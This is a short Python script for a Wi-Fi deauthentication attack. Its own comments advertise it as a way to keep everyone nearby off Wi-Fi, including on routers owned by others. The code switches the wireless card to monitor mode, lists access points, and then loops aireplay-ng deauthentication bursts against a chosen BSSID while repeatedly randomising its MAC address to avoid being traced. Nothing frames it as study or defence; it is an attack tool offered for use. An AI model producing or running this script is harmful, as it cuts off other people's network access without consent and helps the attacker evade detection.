# wifi
###python script for ddosing wifi near by 
###This script will make sure that no body  near you can use wifi , whether router belong to you or some body else . 
##Using this script you can jam all the wifi signals so that no can use it .


import os
import time
os.system('ifconfig wlan0 down')
os.system('iwconfig wlan0 mode monitor')
os.system('ifconfig wlan0 up')
os.system('airmon-ng check kill')
os.system('airmon-ng check kill')
print 'Select the bssid to attack: \nPress Ctl+c to stop'
time.sleep(2)
os.system('airodump-ng wlan0')
a=raw_input('Now provide me the bssid you want to ddos: ')
b=int(raw_input('Now provide at what channal is working: '))
os.system('iwconfig wlan0 channel %i'%b)
while True:
    os.system('aireplay-ng -0 5  -a %s wlan0'%a)
    os.system('ifconfig wlan0 down')
    os.system('macchanger  wlan0 -A')
    os.system('ifconfig wlan0 up')
